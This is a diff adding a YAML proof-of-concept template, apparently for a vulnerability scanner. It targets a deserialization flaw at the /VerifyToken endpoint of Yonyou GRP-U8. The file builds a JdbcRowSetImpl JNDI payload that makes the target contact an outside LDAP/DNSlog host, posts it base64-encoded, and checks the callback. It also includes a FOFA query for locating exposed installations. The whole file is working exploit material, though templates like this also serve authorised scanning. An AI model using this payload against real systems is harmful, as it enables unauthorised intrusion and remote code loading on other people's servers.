@@ -1,0 +1,23 @@
+id: poc-yaml-grp-u8-verifytoken-unserialize
+info:
+  name: 用友GRP-U8 VerifyToken 反序列化漏洞
+  severity: critical
+  tags:
+  - DNSLOG
+  - 反序列化
+  finger: GRP-U8
+  fofa: body="GRP-U8"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+  param: concat(`{"name":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"x":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://`,
+    domain,`","autoCommit":true}}`)
+  payload: base64(param)
+requests:
+- method: POST
+  path: /VerifyToken
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: PARAM={{.payload}}
+  expression: status_code == 500 && contains(body,"JNDI") && reverse.Verify()
+transport: http
